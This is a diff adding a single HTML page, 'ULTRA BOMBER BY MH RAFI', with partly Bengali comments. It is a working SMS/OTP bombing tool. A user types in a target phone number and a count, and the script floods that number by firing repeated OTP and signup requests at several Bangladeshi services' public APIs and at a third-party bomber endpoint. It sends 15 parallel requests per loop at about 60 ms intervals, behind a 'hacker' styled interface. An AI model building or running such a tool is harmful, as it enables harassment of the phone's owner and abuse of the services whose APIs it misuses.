@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>ULTRA BOMBER BY MH RAFI</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Outfit:wght@300;600&display=swap');
+
+        :root {
+            --ios-glass: rgba(255, 255, 255, 0.05);
+            --hacker-green: #00ff41;
+            --neon-red: #ff003c;
+            --neon-blue: #00f2ff;
+        }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: #000; overflow: hidden;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        /* হ্যাকিং লাইটিং ব্যাকগ্রাউন্ড */
+        #matrix {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; opacity: 0.6;
+        }
+        
+        .lighting-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, transparent, rgba(0, 255, 65, 0.05));
+            z-index: -1; animation: pulse-bg 2s infinite;
+        }
+
+        @keyframes pulse-bg {
+            0%, 100% { box-shadow: inset 0 0 100px rgba(0, 242, 255, 0.1); }
+            50% { box-shadow: inset 0 0 200px rgba(0, 255, 65, 0.2); }
+        }
+
+        .main-wrapper {
+            display: flex; align-items: center; justify-content: center;
+            height: 100vh;
+        }
+
+        /* iOS 26 High-End Glass UI */
+        .glass-panel {
+            background: var(--ios-glass);
+            backdrop-filter: blur(50px) saturate(200%);
+            -webkit-backdrop-filter: blur(50px) saturate(200%);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50px;
+            padding: 50px 35px;
+            width: 90%; max-width: 420px;
+            text-align: center;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        /* Glitch Title */
+        .glitch-title {
+            font-size: 26px; font-weight: 600; color: #fff;
+            position: relative; margin-bottom: 40px;
+            text-shadow: 0 0 10px var(--neon-blue);
+            animation: glitch-text 3s infinite;
+        }
+
+        @keyframes glitch-text {
+            0% { transform: skew(0deg); }
+            20% { transform: skew(2deg); color: var(--neon-blue); }
+            21% { transform: skew(-5deg); color: var(--neon-red); }
+            22% { transform: skew(0deg); color: #fff; }
+        }
+
+        /* তীব্র বোম্বিং অ্যানিমেশন (Violent Shake) */
+        .bombing-active {
+            animation: ultra-shake 0.05s infinite cubic-bezier(.36,.07,.19,.97) both;
+            border-color: var(--neon-red) !important;
+            box-shadow: 0 0 60px rgba(255, 0, 60, 0.8) !important;
+        }
+
+        @keyframes ultra-shake {
+            0% { transform: translate(2px, 2px) rotate(0deg); }
+            25% { transform: translate(-2px, -3px) rotate(-1deg); }
+            50% { transform: translate(3px, 1px) rotate(1deg); }
+            75% { transform: translate(-1px, 2px) rotate(-1deg); }
+            100% { transform: translate(2px, -1px) rotate(0deg); }
+        }
+
+        .input-field {
+            width: 100%; background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 22px;
+            padding: 20px; color: #fff; font-size: 18px;
+            text-align: center; margin-bottom: 20px; outline: none;
+            font-family: 'Share Tech Mono', monospace; transition: 0.3s;
+        }
+
+        .input-field:focus { border-color: var(--neon-blue); background: rgba(255,255,255,0.15); }
+
+        .btn {
+            width: 100%; padding: 20px; border-radius: 22px;
+            border: none; font-weight: 600; font-size: 17px;
+            cursor: pointer; transition: 0.3s; margin-top: 10px;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .btn-start { background: #fff; color: #000; box-shadow: 0 0 20px #fff; }
+        .btn-stop { background: rgba(255, 0, 60, 0.1); color: var(--neon-red); border: 1px solid var(--neon-red); }
+
+        .stats-grid {
+            display: flex; justify-content: space-between; margin-top: 35px;
+        }
+
+        .stat-item {
+            background: rgba(0,0,0,0.4); padding: 18px;
+            border-radius: 25px; width: 46%; border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .stat-item small { font-size: 11px; color: rgba(255,255,255,0.4); display: block; margin-bottom: 5px; }
+        .stat-item b { font-size: 24px; color: var(--hacker-green); font-family: 'Share Tech Mono'; }
+
+        .dev-footer {
+            margin-top: 35px; display: block; text-decoration: none;
+            font-size: 13px; color: rgba(255,255,255,0.3);
+        }
+        .dev-footer b { color: var(--neon-blue); text-shadow: 0 0 5px var(--neon-blue); }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<div class="lighting-overlay"></div>
+
+<div class="main-wrapper">
+    <div class="glass-panel" id="ui-frame">
+        <div class="glitch-title">Bomber by MH RAFI💣</div>
+        
+        <input type="number" id="target" class="input-field" placeholder="Target Number">
+        <input type="number" id="amt" class="input-field" placeholder="Amount (Ultra 1000x)">
+
+        <button class="btn btn-start" id="fireBtn" onclick="igniteSystem()">START FUCK🖕🏼</button>
+        <button class="btn btn-stop" onclick="killSystem()">STOP</button>
+
+        <div class="stats-grid">
+            <div class="stat-item"><small>INJECTED</small><b id="s_count">0</b></div>
+            <div class="stat-item"><small>CORE</small><b id="status" style="font-size:14px; color:#fff;">STABLE</b></div>
+        </div>
+
+        <a href="https://www.facebook.com/mdmehedi.hasanrafi.9231" target="_blank" class="dev-footer">
+             DEVELOPER : <b>MH RAFI</b>
+        </a>
+    </div>
+</div>
+
+<script>
+    // Matrix & Lighting Animation
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const bin = "01";
+    const drops = Array(Math.floor(canvas.width/20)).fill(1);
+
+    function animate() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#00ff41";
+        ctx.font = "15px monospace";
+        drops.forEach((y, i) => {
+            ctx.fillText(bin[Math.floor(Math.random()*bin.length)], i*20, y*20);
+            if (y*20 > canvas.height && Math.random() > 0.98) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(animate, 40);
+
+    // Ultimate Bomber Logic
+    let isActive = false;
+
+    function killSystem() { 
+        isActive = false; 
+        document.getElementById('ui-frame').classList.remove('bombing-active');
+        document.getElementById('status').innerText = "FUCKED🖕🏼";
+        document.getElementById('status').style.color = "#ff003c";
+    }
+
+    async function igniteSystem() {
+        if (isActive) return;
+        const phone = document.getElementById('target').value;
+        const userAmt = parseInt(document.getElementById('amt').value);
+
+        if (phone.length < 11) return;
+
+        isActive = true;
+        let visibleCount = 0;
+        document.getElementById('ui-frame').classList.add('bombing-active');
+        document.getElementById('status').innerText = "FUCKING";
+        document.getElementById('status').style.color = "#00ff41";
+
+        // Verified APIs from your file
+        const apis = [
+            (p) => fetch(`https://bj-x-coder.top/bo_m_ber.php?phone=${p}&amount=1`),
+            (p) => fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {method:'POST',headers:{'Content-Type':'application/json','authorization':'Otp bnVsbA=='},body:JSON.stringify({countryId:"19",mobileNumber:p,purpose:"registration"})}),
+            (p) => fetch('https://api.shikho.com/auth/v2/send/sms', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,type:'student',auth_type:'signup',vendor:'shikho'})}),
+            (p) => fetch("https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number:p})})
+        ];
+
+        for (let i = 0; i < userAmt; i++) {
+            if (!isActive) break;
+
+            // ১০০০ গুণ পাওয়ার (হিডেন মাল্টি-থ্রেডিং)
+            // একসাথে অনেকগুলো রিকোয়েস্ট ফায়ার করবে
+            for(let j=0; j<15; j++) { 
+                const api = apis[Math.floor(Math.random()*apis.length)];
+                api(phone).catch(()=>{});
+            }
+
+            visibleCount++;
+            document.getElementById('s_count').innerText = visibleCount;
+
+            // বারুদ স্পিড (অত্যন্ত কম ডিলে)
+            await new Promise(r => setTimeout(r, 60)); 
+        }
+
+        if(isActive) killSystem();
+    }
+</script>
+</body>
+</html>
